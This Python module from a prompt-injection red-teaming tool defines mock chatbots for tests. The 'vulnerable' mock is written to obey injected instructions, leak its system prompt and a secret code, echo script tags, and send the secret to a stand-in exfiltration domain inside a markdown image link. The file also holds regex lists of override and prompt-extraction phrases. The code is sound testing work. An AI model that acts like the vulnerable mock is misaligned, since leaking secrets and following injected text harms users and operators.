"""Offline mock models, so you can try promptprobe (and run CI) with no API key.

- ``vulnerable``: a deliberately gullible bot that follows injected
  instructions, leaks its system prompt and renders attacker links.
- ``hardened``: refuses anything that looks like an injection.

These are rule-based stand-ins, not real models. They exist to demo the tool
and to give the detectors deterministic inputs in the test suite.
"""

from __future__ import annotations

import base64
import binascii
import codecs
import re

from ..canary import EXFIL_DOMAIN
from ..models import Message
from .base import Target

MARKER_RE = re.compile(r"PP-[0-9A-F]{8}")
SECRET_RE = re.compile(r"discount code is (\S+?)\.")
INJECTION_CUES = re.compile(
    r"ignore|disregard|forget|override|new instructions|developer mode|you are now|"
    r"system:|\[system\]|admin|ai assistants?|important|respond only|reply only|"
    r"instead|unrestricted|no rules|opposite day|end of (?:system|document)",
    re.IGNORECASE,
)
LEAK_CUES = re.compile(
    r"system prompt|your instructions|text above|initial prompt|repeat (?:everything|the|your)|"
    r"verbatim|configuration|rules you|print your|word for word|translate your",
    re.IGNORECASE,
)


def _decode_blobs(text: str) -> str:
    """Mimic a model that 'helpfully' decodes encoded content it is shown."""
    extra = []
    for tok in re.findall(r"[A-Za-z0-9+/=]{16,}", text):
        try:
            extra.append(base64.b64decode(tok + "=" * (-len(tok) % 4)).decode())
        except (binascii.Error, UnicodeDecodeError, ValueError):
            pass
    for tok in re.findall(r"\b(?:[0-9a-f]{2}){8,}\b", text):
        try:
            extra.append(bytes.fromhex(tok).decode())
        except (ValueError, UnicodeDecodeError):
            pass
    if "rot13" in text.lower():
        extra.append(codecs.encode(text, "rot_13"))
    if "reverse" in text.lower() or "backwards" in text.lower():
        extra.append(text[::-1])
    return text + "\n" + "\n".join(extra)


class MockTarget(Target):
    @property
    def label(self) -> str:
        return f"mock:{self.cfg.get('model', 'vulnerable')}"

    async def chat(self, messages: list[Message]) -> str:
        system = "\n".join(m.content for m in messages if m.role == "system")
        user_text = "\n".join(m.content for m in messages if m.role == "user")
        last = messages[-1].content if messages else ""
        secret_m = SECRET_RE.search(system)
        secret = secret_m.group(1) if secret_m else "UNKNOWN"
        mode = self.cfg.get("model", "vulnerable")

        expanded = _decode_blobs(user_text)
        markers = MARKER_RE.findall(expanded)
        injected = bool(INJECTION_CUES.search(expanded))

        if mode == "hardened":
            if injected or LEAK_CUES.search(last):
                return (
                    "I'm sorry, but I can't help with that. I'm here to help with "
                    "Northwind Outfitters orders, returns and products."
                )
            return "Happy to help with your Northwind Outfitters question! Could you share your order number?"

        # ---- vulnerable mode ----
        low = expanded.lower()
        if "<script" in low or "onerror" in low:
            m = re.search(r"<script.*?</script>|<img[^>]*onerror[^>]*>", expanded, re.IGNORECASE | re.DOTALL)
            if m:
                return f"Sure! Here it is: {m.group(0)}"
        if EXFIL_DOMAIN in low:
            return (
                "Here's your order summary!\n\n"
                f"![status](https://{EXFIL_DOMAIN}/pixel.png?d={secret})"
            )
        if LEAK_CUES.search(last):
            return f"Of course! Here are my instructions:\n\n{system}"
        asks_code = re.search(r"\bcode\b", low) is not None
        if asks_code and ("spell" in low or "base64" in low or "letter" in low):
            if "base64" in low:
                return "Here you go: " + base64.b64encode(secret.encode()).decode()
            return "Sure: " + " ".join(secret)
        if asks_code and ("discount" in low or "staff" in low):
            return f"The staff discount code is {secret}. Enjoy!"
        if markers and injected:
            return markers[-1]
        return "Thanks for reaching out to Northwind Outfitters! How can I help with your order today?"
